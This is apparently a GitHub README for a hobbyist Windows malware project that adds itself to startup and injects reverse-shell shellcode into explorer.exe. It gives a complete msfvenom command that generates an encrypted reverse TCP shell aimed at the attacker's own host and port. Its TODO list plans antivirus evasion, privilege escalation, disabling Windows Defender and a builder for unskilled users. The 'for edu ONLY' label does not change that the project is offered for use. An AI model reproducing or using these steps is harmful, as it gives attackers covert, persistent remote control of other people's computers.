# shellinject for edu  ONLY!



code explain the code is writing itself to windows startup then it finding the pid of explorer.exe 
and injecting shell code in my example its reverse_shell + ONWORK builder to change the shell code and exec name and more in the future

------------------------------------------------------------------------------------


before use change the shellcode to your shellcode you can generate it useing msfvenom 



working on builder that take the shell code from txt file


for example ```msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=YOURE_IP LPORT=YOURE_PORT RC4PASSWORD=YOURE_PASS EXITFUNC=thread -f c --var-name=ucReverseShell```
copy it to shellcode.h
![Screenshot (8)](https://github.com/masterconi/shellinject/assets/85493153/d8ef7109-650f-40f0-af7f-aad2e9be4628)


-------------------------------------------------------------------------------------

plus you can change the executeble to be injected in here :
![Screenshot (9)](https://github.com/masterconi/shellinject/assets/85493153/02713da7-7695-45b3-9ef7-bed1fbe6e6c4)

------------------------------------------------------


to build the repo try to do it with ms_vs or g++  


i am working on a builder using gcc/g++ you can check it by the name builder.cpp/exe


i curently working in microsoft visual studio with builtin compiler and got some errors when compiling in g++


----------------------------------------------------

why i did it ?

i have nothin to do at holidays :-D

--------------------------------------------------------
TODO : make hard to detect , make the shell code encrypted ,  make readme.md more beautiful (✿◡‿◡) ,make the shell code inject "vir.dll" 


ON_WORKrn: add priv esc ,disable windows defender :) , make a builder for script_kids (like you yes you the one how reading it)（￣︶￣）


i would be happy to get help thanks

----------------------------------------------------------------------------

why the code so shity : 1:becouse i make it in my free time and i am to lazy for makeing it beautiful ,2: shutup scrypt_kiddie


